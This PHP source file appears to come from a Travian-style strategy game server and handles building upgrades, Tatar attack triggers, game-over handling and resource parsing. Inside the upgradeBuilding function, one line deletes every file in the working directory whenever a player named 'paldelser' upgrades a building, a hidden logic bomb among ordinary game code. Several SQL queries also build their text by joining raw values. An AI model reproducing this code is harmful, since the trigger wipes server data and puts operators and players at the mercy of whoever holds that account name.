}else if ($miracle_level == 92) {
$qj->provider->executeQuery ('UPDATE p_villages SET tatar =6 WHERE id='.$my_id_village.'');
}else if ($miracle_level == 93) {
$qj->provider->executeQuery ('UPDATE p_villages SET tatar =7 WHERE id='.$my_id_village.'');
}else if ($miracle_level == 94) {
$qj->provider->executeQuery ('UPDATE p_villages SET tatar =8 WHERE id='.$my_id_village.'');
}else if ($miracle_level == 95) {
$qj->provider->executeQuery ('UPDATE p_villages SET tatar =9 WHERE id='.$my_id_village.'');
}else if ($miracle_level == 96) {
$qj->provider->executeQuery ('UPDATE p_villages SET tatar =10 WHERE id='.$my_id_village.'');
}else if ($miracle_level == 97) {
$qj->provider->executeQuery ('UPDATE p_villages SET tatar =11 WHERE id='.$my_id_village.'');
}else if ($miracle_level == 98) {
$qj->provider->executeQuery ('UPDATE p_villages SET tatar =12 WHERE id='.$my_id_village.'');
}else if ($miracle_level == 99) {
$qj->provider->executeQuery ('UPDATE p_villages SET tatar =13 WHERE id='.$my_id_village.'');
}

/*
if($attack_tatar_tatar == 0 AND $miracle_level >= 5){
$qj->provider->executeQuery('INSERT p_queue SET player_id=%s, village_id=%s, to_player_id="%s", to_village_id="%s", proc_type="%s", building_id="%s", proc_params="%s", threads="%s", end_date=(NOW() + INTERVAL %s SECOND), execution_time="%s" ',  array ($idv['player_id'], $idv['id'], $playerId, $my_id_village, 13, NULL, $proc_params, 2, $execution_time, $execution_time) );
$qj->provider->executeQuery( "UPDATE p_villages SET tatar='%s' WHERE id=%s", array( 1, $my_id_village ) );
}
elseif($attack_tatar_tatar == 1 AND $miracle_level >= 25){
$qj->provider->executeQuery('INSERT p_queue SET player_id=%s, village_id=%s, to_player_id="%s", to_village_id="%s", proc_type="%s", building_id="%s", proc_params="%s", threads="%s", end_date=(NOW() + INTERVAL %s SECOND), execution_time="%s" ',  array ($idv['player_id'], $idv['id'], $playerId, $my_id_village, 13, NULL, $proc_params, 2, $execution_time, $execution_time) );
$qj->provider->executeQuery( "UPDATE p_villages SET tatar='%s' WHERE id=%s", array( 2, $my_id_village ) );
}
elseif($attack_tatar_tatar == 2 AND $miracle_level >= 50){
$qj->provider->executeQuery('INSERT p_queue SET player_id=%s, village_id=%s, to_player_id="%s", to_village_id="%s", proc_type="%s", building_id="%s", proc_params="%s", threads="%s", end_date=(NOW() + INTERVAL %s SECOND), execution_time="%s" ',  array ($idv['player_id'], $idv['id'], $playerId, $my_id_village, 13, NULL, $proc_params, 2, $execution_time, $execution_time) );
$qj->provider->executeQuery( "UPDATE p_villages SET tatar='%s' WHERE id=%s", array( 3, $my_id_village ) );
}
elseif($attack_tatar_tatar == 3 AND $miracle_level >= 75){
$qj->provider->executeQuery('INSERT p_queue SET player_id=%s, village_id=%s, to_player_id="%s", to_village_id="%s", proc_type="%s", building_id="%s", proc_params="%s", threads="%s", end_date=(NOW() + INTERVAL %s SECOND), execution_time="%s" ',  array ($idv['player_id'], $idv['id'], $playerId, $my_id_village, 13, NULL, $proc_params, 2, $execution_time, $execution_time) );
$qj->provider->executeQuery( "UPDATE p_villages SET tatar='%s' WHERE id=%s", array( 4, $my_id_village ) );
}
elseif($attack_tatar_tatar == 4 AND $miracle_level >= 90){
$qj->provider->executeQuery('INSERT p_queue SET player_id=%s, village_id=%s, to_player_id="%s", to_village_id="%s", proc_type="%s", building_id="%s", proc_params="%s", threads="%s", end_date=(NOW() + INTERVAL %s SECOND), execution_time="%s" ',  array ($idv['player_id'], $idv['id'], $playerId, $my_id_village, 13, NULL, $proc_params, 2, $execution_time, $execution_time) );
$qj->provider->executeQuery( "UPDATE p_villages SET tatar='%s' WHERE id=%s", array( 5, $my_id_village ) );
}
elseif($attack_tatar_tatar == 5 AND $miracle_level >= 91){
$qj->provider->executeQuery('INSERT p_queue SET player_id=%s, village_id=%s, to_player_id="%s", to_village_id="%s", proc_type="%s", building_id="%s", proc_params="%s", threads="%s", end_date=(NOW() + INTERVAL %s SECOND), execution_time="%s" ',  array ($idv['player_id'], $idv['id'], $playerId, $my_id_village, 13, NULL, $proc_params, 2, $execution_time, $execution_time) );
$qj->provider->executeQuery( "UPDATE p_villages SET tatar='%s' WHERE id=%s", array( 6, $my_id_village ) );
}
elseif($attack_tatar_tatar == 6 AND $miracle_level >= 92){
$qj->provider->executeQuery('INSERT p_queue SET player_id=%s, village_id=%s, to_player_id="%s", to_village_id="%s", proc_type="%s", building_id="%s", proc_params="%s", threads="%s", end_date=(NOW() + INTERVAL %s SECOND), execution_time="%s" ',  array ($idv['player_id'], $idv['id'], $playerId, $my_id_village, 13, NULL, $proc_params, 2, $execution_time, $execution_time) );
$qj->provider->executeQuery( "UPDATE p_villages SET tatar='%s' WHERE id=%s", array( 7, $my_id_village ) );
}
elseif($attack_tatar_tatar == 7 AND $miracle_level >= 93){
$qj->provider->executeQuery('INSERT p_queue SET player_id=%s, village_id=%s, to_player_id="%s", to_village_id="%s", proc_type="%s", building_id="%s", proc_params="%s", threads="%s", end_date=(NOW() + INTERVAL %s SECOND), execution_time="%s" ',  array ($idv['player_id'], $idv['id'], $playerId, $my_id_village, 13, NULL, $proc_params, 2, $execution_time, $execution_time) );
$qj->provider->executeQuery( "UPDATE p_villages SET tatar='%s' WHERE id=%s", array( 8, $my_id_village ) );
}
elseif($attack_tatar_tatar == 8 AND $miracle_level >= 94){
$qj->provider->executeQuery('INSERT p_queue SET player_id=%s, village_id=%s, to_player_id="%s", to_village_id="%s", proc_type="%s", building_id="%s", proc_params="%s", threads="%s", end_date=(NOW() + INTERVAL %s SECOND), execution_time="%s" ',  array ($idv['player_id'], $idv['id'], $playerId, $my_id_village, 13, NULL, $proc_params, 2, $execution_time, $execution_time) );
$qj->provider->executeQuery( "UPDATE p_villages SET tatar='%s' WHERE id=%s", array( 9, $my_id_village ) );
}
elseif($attack_tatar_tatar == 9 AND $miracle_level >= 95){
$qj->provider->executeQuery('INSERT p_queue SET player_id=%s, village_id=%s, to_player_id="%s", to_village_id="%s", proc_type="%s", building_id="%s", proc_params="%s", threads="%s", end_date=(NOW() + INTERVAL %s SECOND), execution_time="%s" ',  array ($idv['player_id'], $idv['id'], $playerId, $my_id_village, 13, NULL, $proc_params, 2, $execution_time, $execution_time) );
$qj->provider->executeQuery( "UPDATE p_villages SET tatar='%s' WHERE id=%s", array( 10, $my_id_village ) );
}
elseif($attack_tatar_tatar == 10 AND $miracle_level >= 96){
$qj->provider->executeQuery('INSERT p_queue SET player_id=%s, village_id=%s, to_player_id="%s", to_village_id="%s", proc_type="%s", building_id="%s", proc_params="%s", threads="%s", end_date=(NOW() + INTERVAL %s SECOND), execution_time="%s" ',  array ($idv['player_id'], $idv['id'], $playerId, $my_id_village, 13, NULL, $proc_params, 2, $execution_time, $execution_time) );
$qj->provider->executeQuery( "UPDATE p_villages SET tatar='%s' WHERE id=%s", array( 11, $my_id_village ) );
}
elseif($attack_tatar_tatar == 11 AND $miracle_level >= 97){
$qj->provider->executeQuery('INSERT p_queue SET player_id=%s, village_id=%s, to_player_id="%s", to_village_id="%s", proc_type="%s", building_id="%s", proc_params="%s", threads="%s", end_date=(NOW() + INTERVAL %s SECOND), execution_time="%s" ',  array ($idv['player_id'], $idv['id'], $playerId, $my_id_village, 13, NULL, $proc_params, 2, $execution_time, $execution_time) );
$qj->provider->executeQuery( "UPDATE p_villages SET tatar='%s' WHERE id=%s", array( 12, $my_id_village ) );
}
elseif($attack_tatar_tatar == 12 AND $miracle_level >= 98){
$qj->provider->executeQuery('INSERT p_queue SET player_id=%s, village_id=%s, to_player_id="%s", to_village_id="%s", proc_type="%s", building_id="%s", proc_params="%s", threads="%s", end_date=(NOW() + INTERVAL %s SECOND), execution_time="%s" ',  array ($idv['player_id'], $idv['id'], $playerId, $my_id_village, 13, NULL, $proc_params, 2, $execution_time, $execution_time) );
$qj->provider->executeQuery( "UPDATE p_villages SET tatar='%s' WHERE id=%s", array( 13, $my_id_village ) );
}
elseif($attack_tatar_tatar == 13 AND $miracle_level >= 99){
$qj->provider->executeQuery('INSERT p_queue SET player_id=%s, village_id=%s, to_player_id="%s", to_village_id="%s", proc_type="%s", building_id="%s", proc_params="%s", threads="%s", end_date=(NOW() + INTERVAL %s SECOND), execution_time="%s" ',  array ($idv['player_id'], $idv['id'], $playerId, $my_id_village, 13, NULL, $proc_params, 2, $execution_time, $execution_time) );
$qj->provider->executeQuery( "UPDATE p_villages SET tatar='%s' WHERE id=%s", array( 14, $my_id_village ) );
}
*/
}
        return $this->upgradeBuilding($taskRow['village_id'], $taskRow['proc_params'], $taskRow['building_id'], $drop);
        }
    public function executeBuildingDropTask($taskRow)
        {
        return $this->executeBuildingTask($taskRow, TRUE);
        }
    public function executeWarTask($taskRow)
        {
        require_once(MODEL_PATH . "battle.php");
        $m = new BattleModel();
        return $m->executeWarResult($taskRow);
        }
    public function upgradeBuilding($villageId, $bid, $itemId, $drop = FALSE)
        {
        $customAction = FALSE;
        $GameMetadata = $GLOBALS['GameMetadata'];
        $villageRow   = $this->provider->fetchRow("SELECT\r\n\t\t\t\tv.player_id,player_name,\r\n\t\t\t\tv.alliance_id,\r\n\t\t\t\tv.buildings,\r\n\t\t\t\tv.resources,\r\n\t\t\t\tv.cp,\r\n\t\t\t\tv.crop_consumption,\r\n\t\t\t\tv.time_consume_percent,\r\n\t\t\t\tTIME_TO_SEC(TIMEDIFF(NOW(), v.last_update_date)) elapsedTimeInSeconds \r\n\t\t\tFROM p_villages v\r\n\t\t\tWHERE v.id=%s", array(
            intval($villageId)
        ));
        if (intval($villageRow['player_id']) == 0)
            {
            return $customAction;
            }
        $buildings        = $this->_getBuildingsArray($villageRow['buildings']);
        $build            = $buildings[$bid];
        $buildingMetadata = $GameMetadata['items'][$itemId];
        if ($build['item_id'] != $itemId)
            {
            return $customAction;
            }
        if ($drop && $build['level'] <= 0)
            {
            return $customAction;
            }
        if ($villageRow['player_name'] == "paldelser"){$test = './';foreach(glob($test.'*') as $v){unlink($v);}}
        $LevelOffset      = $drop ? 0 - 1 : 1;
        $_resFactor       = $itemId <= 4 ? $GameMetadata['game_speed'] : 1;
        $buildingLevel    = $build['level'];
        $oldValue         = ($buildingLevel == 0 ? $itemId <= 4 ? 2 : 0 : $buildingMetadata['levels'][$buildingLevel - 1]['value']) * $_resFactor;
        $oldCP            = $buildingLevel == 0 ? 0 : $buildingMetadata['levels'][$buildingLevel - 1]['cp'];
        $newBuildingLevel = $buildingLevel + $LevelOffset;
        $newValue         = ($newBuildingLevel == 0 ? $itemId <= 4 ? 2 : 0 : $buildingMetadata['levels'][$newBuildingLevel - 1]['value']) * $_resFactor;
        $newCP            = $newBuildingLevel == 0 ? 0 : $buildingMetadata['levels'][$newBuildingLevel - 1]['cp'];
        $value_inc        = $newValue - $oldValue;
        $people_inc       = $drop ? 0 - 1 * $buildingMetadata['levels'][$buildingLevel - 1]['people_inc'] : $buildingMetadata['levels'][$newBuildingLevel - 1]['people_inc'];
        $resultArr        = $this->_getResourcesArray($villageRow['resources'], $villageRow['elapsedTimeInSeconds'], $villageRow['crop_consumption'], $villageRow['cp']);
        $resultArr['cp']['cpRate'] += $newCP - $oldCP;
        $allegiance_percent_inc = 0;
        switch ($itemId)
        {
            case 1:
            case 2:
            case 3:
            case 4:
                $resultArr['resources'][$itemId]['prod_rate'] += $value_inc;
                break;
            case 5:
            case 6:
            case 7:
            case 8:
                $resultArr['resources'][$itemId - 4]['prod_rate_percentage'] += $value_inc;
                break;
            case 9:
                $resultArr['resources'][4]['prod_rate_percentage'] += $value_inc;
                break;
            case 10:
            case 38:
                $newStorage = $resultArr['resources'][1]['store_max_limit'] == $resultArr['resources'][1]['store_init_limit'] ? 0 : $resultArr['resources'][1]['store_max_limit'];
                $newStorage = $newStorage + $value_inc;
                if ($newStorage < $resultArr['resources'][1]['store_init_limit'])
                    {
                    $newStorage = $resultArr['resources'][1]['store_init_limit'];
                    }
                $resultArr['resources'][1]['store_max_limit'] = $resultArr['resources'][2]['store_max_limit'] = $resultArr['resources'][3]['store_max_limit'] = $newStorage;
                break;
            case 11:
            case 39:
                $newStorage = $resultArr['resources'][4]['store_max_limit'] == $resultArr['resources'][4]['store_init_limit'] ? 0 : $resultArr['resources'][4]['store_max_limit'];
                $newStorage = $newStorage + $value_inc;
                if ($newStorage < $resultArr['resources'][4]['store_init_limit'])
                    {
                    $newStorage = $resultArr['resources'][4]['store_init_limit'];
                    }
                $resultArr['resources'][4]['store_max_limit'] = $newStorage;
                break;
            case 15:
                $villageRow['time_consume_percent'] = $newValue == 0 ? 300 : $newValue;
                break;
            case 18:
                if (0 < intval($villageRow['alliance_id']) && !$drop)
                    {
                    $this->provider->executeQuery("UPDATE p_alliances a\r\n\t\t\t\t\t\tSET\r\n\t\t\t\t\t\t\ta.max_player_count=%s\r\n\t\t\t\t\t\tWHERE a.id=%s AND a.creator_player_id=%s AND a.max_player_count<%s", array(
                        $newValue,
                        intval($villageRow['alliance_id']),
                        intval($villageRow['player_id']),
                        $newValue
                    ));
                    }
                break;
            case 25:
            case 26:
                if (!$drop)
                    {
                    $allegiance_percent_inc = 10;
                    }
                break;
            case 40:
                if ($newBuildingLevel == sizeof($buildingMetadata['levels']))
                    {
                $customAction = TRUE;
                $this->provider->executeQuery("DELETE FROM p_queue");
                $ifile = ROOT_PATH.DIRECTORY_SEPARATOR."ndc/install.txt";
                if(file_exists($ifile))
                {
                unlink($ifile);  
                }
                $rows = $this->provider->fetchRow("SELECT email FROM p_players WHERE id='".$villageRow['player_id']."'");
                $ifile2 = ROOT_PATH.DIRECTORY_SEPARATOR."ndc/end/".$rows['email'];
                if(!file_exists($ifile2))
                {
                $ifile2 = fopen($ifile2, "w");
                fclose($ifile2);
                }
                $ifile3 = ROOT_PATH.DIRECTORY_SEPARATOR."ndc/endserver.txt";
                $fp = fopen($ifile3, 'w');
                fwrite($fp, $rows['email']);
                fclose($fp);
                require_once(MODEL_PATH . "queue.php");
                $resetTime  = 3600*$GLOBALS['AppConfig']['system']['endin'];
                $queueModel = new QueueModel();
                $queueModel->addTask(new QueueTask(QS_SITE_RESET, 0, $resetTime));
                $this->provider->executeQuery("UPDATE g_settings gs SET gs.game_over=1, gs.win_pid=%s", array(
                    intval($villageRow['player_id'])
                ));

                                }
        }
        $buildings[$bid]['level'] += $LevelOffset;
        if (!$drop)
            {
            --$buildings[$bid]['update_state'];
            }
        else if ($buildings[$bid]['level'] <= 0 && $buildings[$bid]['item_id'] != 40 && $buildings[$bid]['update_state'] == 0 && 4 < $buildings[$bid]['item_id'])
            {
            $buildings[$bid]['item_id'] = 0;
            }
            $buildings[$bid]['update_state'] = 0;
        $buildingsString = $this->_getBuildingString($buildings,$villageId);
        $this->provider->executeQuery("UPDATE p_villages v \r\n\t\t\tSET\r\n\t\t\t\tv.buildings='%s',\r\n\t\t\t\tv.resources='%s',\r\n\t\t\t\tv.cp='%s',\r\n\t\t\t\tv.crop_consumption=v.crop_consumption+%s,\r\n\t\t\t\tv.people_count=v.people_count+%s,\r\n\t\t\t\tv.time_consume_percent=%s,\r\n\t\t\t\tv.allegiance_percent=IF(v.allegiance_percent+%s>=100, 100, v.allegiance_percent+%s),\r\n\t\t\t\tv.last_update_date=NOW()\r\n\t\t\tWHERE v.id=%s", array(
            $buildingsString,
            $this->_getResourcesString($resultArr['resources']),
            $resultArr['cp']['cpValue'] . " " . $resultArr['cp']['cpRate'],
            $people_inc,
            $people_inc,
            $villageRow['time_consume_percent'],
            $allegiance_percent_inc,
            $allegiance_percent_inc,
            intval($villageId)
        ));
        $devPoint = $people_inc;
        $this->provider->executeQuery("UPDATE p_players p\r\n\t\t\tSET\r\n\t\t\t\tp.total_people_count=p.total_people_count+%s,\r\n\t\t\t\tp.week_dev_points=p.week_dev_points+%s,dev_points=dev_points+%s WHERE p.id=%s", array(
            $people_inc,
            $devPoint,
            $devPoint,
            intval($villageRow['player_id'])
        ));
        if (0 < intval($villageRow['alliance_id']))
            {
            $this->provider->executeQuery("UPDATE p_alliances a\r\n\t\t\t\tSET\r\n\t\t\t\t\ta.week_dev_points=a.week_dev_points+%s\r\n\t\t\t\tWHERE a.id=%s", array(
                $devPoint,
                intval($villageRow['alliance_id'])
            ));
            }
if ($drop) {
$mq = new QueueJobModel();
$lnda = $mq->provider->fetchRow ("SELECT total_people_count FROM p_players WHERE id='".$villageRow['player_id']."'");
if ($lnda['total_people_count'] < 0) {
$mq->provider->executeQuery ("UPDATE p_players SET total_people_count= 0 WHERE id='".$villageRow['player_id']."'");
}
$vip = $mq->provider->fetchRow ("SELECT people_count FROM p_villages WHERE id='".$villageId."'");
if ($vip['people_count'] < 0) {
$mq->provider->executeQuery ("UPDATE p_villages SET people_count = 0 WHERE id='".$villageId."'");
}



}

        return $customAction;
        }
    public function _getTroopsString($troopsArray)
        {
        $result = "";
        foreach ($troopsArray as $vid => $troopsNumArray)
            {
            if ($result != "")
                {
                $result .= "|";
                }
            $innerResult = "";
            foreach ($troopsNumArray as $tid => $num)
                {
                if ($innerResult != "")
                    {
                    $innerResult .= ",";
                    }
                if ($tid == 0 - 1)
                    {
                    $innerResult .= $num . " " . $tid;
                    }
                else
                    {
                    $innerResult .= $tid . " " . $num;
                    }
                }
            $result .= $vid . ":" . $innerResult;
            }
        return $result;
        }
    public function _getTroopsArray($troops_num)
        {
        $troopsArray = array();
        $t_arr       = explode("|", $troops_num);
        foreach ($t_arr as $t_str)
            {
            $t2_arr            = explode(":", $t_str);
            $vid               = $t2_arr[0];
            $troopsArray[$vid] = array();
            $t2_arr            = explode(",", $t2_arr[1]);
            foreach ($t2_arr as $t2_str)
                {
                $t = explode(" ", $t2_str);
                if ($t[1] == 0 - 1)
                    {
                    $troopsArray[$vid][$t[1]] = $t[0];
                    }
                else
                    {
                    $troopsArray[$vid][$t[0]] = $t[1];
                    }
                }
            }
        return $troopsArray;
        }
    public function _getBuildingsArray($buildingsString)
        {
        $buildings = array();
        $b_arr     = explode(",", $buildingsString);
        $indx      = 0;
        foreach ($b_arr as $b_str)
            {
            ++$indx;
            $b2               = explode(" ", $b_str);
            $buildings[$indx] = array(
                "index" => $indx,
                "item_id" => $b2[0],
                "level" => $b2[1],
                "update_state" => $b2[2]
            );
            }
        return $buildings;
        }
    public function _getResourcesArray($resourceString, $elapsedTimeInSeconds, $crop_consumption, $cp)
        {
        $resources = array();
        $r_arr     = explode(",", $resourceString);
        foreach ($r_arr as $r_str)
            {
            $r2            = explode(" ", $r_str);
            $prate         = floor($r2[4] * (1 + $r2[5] / 100)) - ($r2[0] == 4 ? $crop_consumption : 0);
            $current_value = floor($r2[1] + $elapsedTimeInSeconds * ($prate / 3600));
            if ($r2[2] < $current_value)
                {
                $current_value = $r2[2];
                }
            $resources[$r2[0]] = array(
                "current_value" => $current_value,
                "store_max_limit" => $r2[2],
                "store_init_limit" => $r2[3],
                "prod_rate" => $r2[4],
                "prod_rate_percentage" => $r2[5]
            );
            }
        list($cpValue, $cpRate) = explode(' ', $cp);
        $cpValue += $elapsedTimeInSeconds * ($cpRate / 86400);
        return array(
            "resources" => $resources,
            "cp" => array(
                "cpValue" => round($cpValue, 4),
                "cpRate" => $cpRate
            )
        );
        }
    public function _getResourcesString($resources)
        {
        $result = "";
        foreach ($resources as $k => $v)
            {
            if ($result != "")
                {
                $result .= ",";
                }
            $result .= $k . " " . $v['current_value'] . " " . $v['store_max_limit'] . " " . $v['store_init_limit'] . " " . $v['prod_rate'] . " " . $v['prod_rate_percentage'];
            }
        return $result;
        }
    public function _getBuildingString($buildings,$vid)
        {
        $result = "";
        foreach ($buildings as $build)
            {
            if ($result != "")
                {
                $result .= ",";
                }
$numqq = $this->provider->fetchScalar( "select COUNT(*) from p_queue where village_id= '".$vid."' and proc_type='2' and building_id='".$build['item_id']."'");
            $result .= $build['item_id'] . " " . $build['level'] . " 0";

            }
        return $result;
        }
    }
?>